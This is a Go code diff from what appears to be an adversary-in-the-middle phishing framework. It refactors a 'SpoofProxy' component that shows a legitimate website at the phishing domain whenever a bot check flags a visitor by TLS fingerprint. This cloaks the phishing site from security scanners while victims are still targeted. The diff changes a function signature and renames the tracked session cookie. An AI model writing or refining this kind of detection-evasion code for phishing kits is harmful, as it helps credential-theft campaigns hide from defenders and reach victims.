@@ -9,15 +9,12 @@ import (
 	"net/url"
 	"strings"
 	"time"
-
-	"github.com/travisbale/mirage/internal/aitm"
 )
 
 // SpoofProxy transparently reverse-proxies a legitimate website at the
-// phishing domain. When BotGuardCheck sets ProxyContext.BotVerdict = VerdictSpoof,
-// the pipeline short-circuits and calls SpoofProxy.ServeHTTP. The victim's
-// browser sees the content of spoof_url rendered at the phishing domain —
-// no redirect is issued.
+// phishing domain. When the bot guard check detects a bad JA4 signature,
+// the proxy calls SpoofProxy.ServeHTTP. The victim's browser sees the
+// content of spoof_url rendered at the phishing domain — no redirect is issued.
 type SpoofProxy struct {
 	logger    *slog.Logger
 	transport *http.Transport
@@ -36,7 +33,7 @@ func NewSpoofProxy(logger *slog.Logger) *SpoofProxy {
 // ServeHTTP proxies the incoming request to spoofURL, rewrites domain
 // references in the response body, and writes the result back to w.
 // If spoofURL is empty, a 200 OK with no body is returned.
-func (sp *SpoofProxy) ServeHTTP(w http.ResponseWriter, r *http.Request, spoofURL string, pctx *aitm.ProxyContext) {
+func (sp *SpoofProxy) ServeHTTP(w http.ResponseWriter, r *http.Request, spoofURL string) {
 	if spoofURL == "" {
 		w.WriteHeader(http.StatusOK)
 		return
@@ -58,7 +55,7 @@ func (sp *SpoofProxy) ServeHTTP(w http.ResponseWriter, r *http.Request, spoofURL
 				pr.Out.Header.Set("Referer", rewriteHostInURL(referer, target.Host))
 			}
 			// Remove session tracking cookie so the spoofed site starts fresh.
-			removeCookie(pr.Out, "_msess")
+			removeCookie(pr.Out, "__ss")
 		},
 		Transport: sp.transport,
 		ModifyResponse: func(resp *http.Response) error {
